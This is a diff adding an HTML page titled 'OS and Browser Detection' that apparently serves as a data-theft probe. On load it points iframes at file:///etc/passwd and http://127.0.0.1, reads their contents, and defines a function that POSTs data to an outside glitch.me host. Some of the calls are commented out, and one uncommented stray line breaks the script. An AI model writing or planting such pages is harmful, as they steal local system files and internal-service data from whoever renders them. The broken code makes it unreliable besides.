@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>OS and Browser Detection</title>
+    <script>
+
+      
+      document.addEventListener('DOMContentLoaded', function() {
+            var platform = navigator.platform;
+            var userAgent = navigator.userAgent;
+            var uaOs;
+
+            // OS 
+            if (platform.includes('Win')) {
+                uaOs = 'Windows';
+            } else if (platform.includes('Linux')) {
+                uaOs = 'Linux';
+            } else {
+                uaOs = 'Linux';
+            }
+
+            // OS from User-agent
+            if (userAgent.includes('Windows')) {
+                uaOs = 'Windows';
+            } else if (userAgent.includes('Linux')) {
+                uaOs = 'Linux';
+            }
+
+            // logging OS, browser version
+            console.log("Platform: " + platform);
+            console.log("User-Agent: " + userAgent);
+            console.log("Determined OS: " + uaOs);
+
+             set iframe src
+             document.getElementById('iframe1').src = 'file:///etc/passwd';
+             document.getElementById('iframe2').src = 'http://127.0.0.1';
+
+        
+            // iframe1 onload    
+            var iframe = document.getElementById('iframe1');
+            iframe.onload = function() {
+                var iframeContent = iframe.contentWindow.document.body.innerHTML;
+              
+                console.log(document.getElementById('iframe1').src);
+                // transfer data
+                //sendDataToServer(document.getElementById('iframe1').src , iframeContent);
+
+                
+              
+                // if (iframeContent.includes('product')) {
+                //     console.log("'product' found in iframe1");
+                // } else {
+                //     console.log("'product' not found in iframe1");
+                // }
+            };
+
+      });
+
+
+//     // request AJAX for collecting data
+//     function fetchData() {
+//         // print response after AJAX request
+//         var xhr = new XMLHttpRequest();
+      
+//         //var url = "https://artistic-spiny-network.glitch.me/hello.html";
+//         //var url = "file:///C://Windows//win.ini";
+//         var url = "file:///etc/passwd";
+//         //var url = "http://127.0.0.1/server-status";
+      
+//         xhr.open('GET', url, true);
+
+//         xhr.onreadystatechange = function() {
+//             if (xhr.readyState === XMLHttpRequest.DONE) {
+//                 // get response body
+//                 var responseBody = xhr.responseText;
+
+//                 // print res body
+//                 console.log('Response Body:', responseBody);
+
+//                // transfer data
+//                 sendDataToServer(url, responseBody);
+//             }
+//         };
+//         xhr.send();  // request for checking
+//     }
+      
+      
+    // Transfer data to server
+    function sendDataToServer(url, data) {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://artistic-spiny-network.glitch.me/receive', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === XMLHttpRequest.DONE) {
+                // process data
+                if (xhr.status === 200) {
+                    console.log('Data successfully sent to the server');
+                } else {
+                    console.log('Error sending data to the server');
+                }
+            }
+        };
+
+        // trans data (json)
+        xhr.send(JSON.stringify({ url: url, data: data }));
+    }
+
+//     // start to collect data
+//     fetchData();
+      
+    </script>
+</head>
+<body>
+    <h1>OS and Browser Detection</h1>
+    <iframe id="iframe1" width="300" height="200"></iframe>
+    <iframe id="iframe2" width="300" height="200"></iframe>
+</body>
+</html>
